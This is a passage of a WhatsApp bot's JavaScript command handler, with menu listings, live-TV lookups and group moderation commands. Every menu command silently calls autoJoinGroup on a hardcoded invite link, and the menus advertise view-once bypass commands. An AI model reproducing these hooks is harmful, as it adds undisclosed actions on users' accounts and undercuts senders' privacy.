│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'ownermenu':
case 'CYBERowner': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antidelete
│❖ ${prefix}antiedit
│❖ ${prefix}anticall
│❖ ${prefix}setbio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreactstatusdelay
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}autoviewstatusdelay
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}config
│❖ ${prefix}delanticallmsg
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}locksettings
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}set
│❖ ${prefix}setanticallmsg
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
│❖ ${prefix}settings
│❖ ${prefix}showanticallmsg
│❖ ${prefix}statusemoji
│❖ ${prefix}sudo
│❖ ${prefix}testanticallmsg
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'stickermenu':
case 'CYBERsticker': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}delstickercmd
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}setstickercmd
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickercmds
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'toolmenu':
case 'CYBERtool': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}carimage
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}ffstalk
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}npm
│❖ ${prefix}npmstalk
│❖ ${prefix}profile
│❖ ${prefix}profile-pictures
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}styletext
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}whois
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'voicemenu':
case 'CYBERvoice': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'othermenu':
case 'CYBERother': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xvideos\n│❖ ' + prefix + 'xvideodl\n│❖ ' + prefix + 'xvideosearch\n│❖ ' + prefix + 'xnxxsearch\n│❖ ' + prefix + 'xnxx' : '│🔒 *Locked Commands*\n│  Use .addkey to access these'}
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 📺 TV CHANNELS* ◆━━┓
│❖ ${prefix}tvmenu
│  ↳ _See all 91 Pakistan channels_
│❖ ${prefix}tv [channel name]
│  ↳ _Get live stream link_
│
│ *Example:*
│  ${prefix}tv geo news
│  ${prefix}tv ary news
│  ${prefix}tv hum tv
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

// ═══════════════════════════════════════════════════════
// 📺 TV CHANNELS — Pakistan Live TV
// ═══════════════════════════════════════════════════════
case 'tvmenu':
case 'tvchannels':
case 'pktv': {
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📺', key: m.key } });

        const res = await axios.get('https://api.princetechn.com/api/newsstreaming/country/pk?apikey=prince', { timeout: 12000 });
        const channels = res.data?.result?.channels;
        if (!channels || !channels.length) throw new Error('No channels found');

        // Group by category
        const grouped = {};
        for (const ch of channels) {
            const cat = ch.category || 'Other';
            if (!grouped[cat]) grouped[cat] = [];
            grouped[cat].push(ch.name);
        }

        const catEmoji = { News: '📰', Entertainment: '🎭', Music: '🎵', Religious: '🕌', Sports: '⚽', Kids: '🧒', Other: '📡' };

        let menuText = `📺 *CYBER TV — Pakistan Live Channels*\n`;
        menuText += `🇵🇰 Total: *${channels.length} Channels*\n`;
        menuText += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

        for (const [cat, names] of Object.entries(grouped)) {
            const emoji = catEmoji[cat] || '📡';
            menuText += `${emoji} *${cat.toUpperCase()}* (${names.length})\n`;
            names.forEach((n, i) => { menuText += `  ${i + 1}. ${n}\n`; });
            menuText += `\n`;
        }

        menuText += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        menuText += `📌 *Usage:* ${prefix}tv [channel name]\n`;
        menuText += `📌 *Example:* ${prefix}tv geo news\n`;
        menuText += `\n_Open link in VLC or any media player_`;

        reply(menuText);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *TV Channels*\n\nFailed to load channels. Try again later.`);
    }
    break;
}

case 'tv':
case 'livetv':
case 'watchtv': {
    if (!text) return reply(`📺 *CYBER Live TV*\n\nUsage: ${prefix}tv [channel name]\n\nExamples:\n• ${prefix}tv geo news\n• ${prefix}tv ary news\n• ${prefix}tv hum tv\n• ${prefix}tv ptv sports\n\nType *${prefix}tvmenu* to see all 91 channels`);

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📺', key: m.key } });

        const res = await axios.get('https://api.princetechn.com/api/newsstreaming/country/pk?apikey=prince', { timeout: 12000 });
        const channels = res.data?.result?.channels;
        if (!channels || !channels.length) throw new Error('No channels');

        const query = text.toLowerCase().trim();

        // Fuzzy search — find best matching channel
        const scored = channels.map(ch => {
            const name = ch.name.toLowerCase();
            let score = 0;
            if (name === query) score = 100;
            else if (name.startsWith(query)) score = 80;
            else if (name.includes(query)) score = 60;
            else {
                const words = query.split(' ');
                const matched = words.filter(w => name.includes(w)).length;
                score = (matched / words.length) * 50;
            }
            return { ...ch, score };
        }).filter(ch => ch.score > 0).sort((a, b) => b.score - a.score);

        if (!scored.length) {
            return reply(`❌ *Channel Not Found*\n\n"${text}" se koi channel match nahi kiya.\n\nType *${prefix}tvmenu* to see all available channels.`);
        }

        const ch = scored[0];
        const catEmoji = { News: '📰', Entertainment: '🎭', Music: '🎵', Religious: '🕌', Sports: '⚽', Kids: '🧒', Other: '📡' };
        const emoji = catEmoji[ch.category] || '📡';

        const msg = `📺 *${ch.name}*\n\n` +
            `${emoji} Category: *${ch.category}*\n` +
            `🇵🇰 Country: Pakistan\n\n` +
            `🔗 *Live Stream Link:*\n${ch.url}\n\n` +
            `_Open link in VLC Media Player or any IPTV app_\n` +
            `_Copy the link and paste in VLC → Media → Open Network Stream_`;

        // Send with logo image if available
        if (ch.logo) {
            try {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({ image: { url: ch.logo }, caption: msg }),
                    { quoted: m }
                );
            } catch (_) {
                reply(msg);
            }
        } else {
            reply(msg);
        }

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *TV Error*\n\nFailed to load channel. Try again later.`);
    }
    break;
}

// === Get Your Free Bot Command ===
case 'getbot':
case 'gellltbot':
case 'freebot': {
    let botInfo = 
`*CYBER — Bot Deployment*

Interested in deploying your own WhatsApp bot?
The process is simple and takes less than 2 minutes.

▸ Contact the owner to get connected.

▸ Your instance will be ready immediately.

Use *${prefix}CYBER* to see all menu.`;

    reply(botInfo);
}
break;
case 'test': {
  let botInfo =
'*CYBER ᴀʟᴡᴀʏs ᴛʜᴇʀᴇ ғᴏʀ ʏᴏᴜ 🚀🔥*'

  reply(botInfo);
}

break;

case 'groupjid':
case 'gid': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    reply(`📌 *Group JID:*\n\`${m.chat}\``);
}
break;

case 'invite':
case 'gclink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const code = await devtrust.groupInviteCode(m.chat);
        const link = `https://chat.whatsapp.com/${code}`;
        reply(`🔗 *Group Invite Link*\n\n${link}`);
    } catch (e) {
        reply(`❌ *Cannot get invite link*\n\nReason: This group may have "Only admins can send invite links" enabled.`);
    }
}
break;

// ======================[ 🔇 MUTE/UNMUTE COMMANDS - FIXED ]======================

case 'muteuser':
case 'mutemember': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to mute*");
    
    if (user === m.sender) return reply("❌ *You cannot mute yourself*");
    
    if (isCreator && user === botNumber) return reply("❌ *Cannot mute the bot*");
    
    if (!global.muted) global.muted = {};
    if (!global.muted[m.chat]) global.muted[m.chat] = [];
    
    if (global.muted[m.chat].includes(user)) {
        return reply(`⚠️ *@${user.split('@')[0]} is already muted*\nUse .unmute to unmute`, [user]);
    }
    
    global.muted[m.chat].push(user);
    saveMutedData(global.muted);  // <-- ADD THIS LINE
    reply(`🔇 *@${user.split('@')[0]} has been muted*`, [user]);
}
break;

case 'unmuteuser':
case 'unmutemember': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to unmute*");
    
    if (!global.muted) global.muted = {};
    if (!global.muted[m.chat]) global.muted[m.chat] = [];
    
    if (!global.muted[m.chat].includes(user)) {
        return reply(`⚠️ *@${user.split('@')[0]} is not muted*`, [user]);
    }
    
    global.muted[m.chat] = global.muted[m.chat].filter(jid => jid !== user);
    saveMutedData(global.muted);  // <-- ADD THIS LINE
    reply(`🔊 *@${user.split('@')[0]} has been unmuted*`, [user]);
}
break;

// ======================[ 🔗 ANTI-LINK ]======================
case 'antilink': {
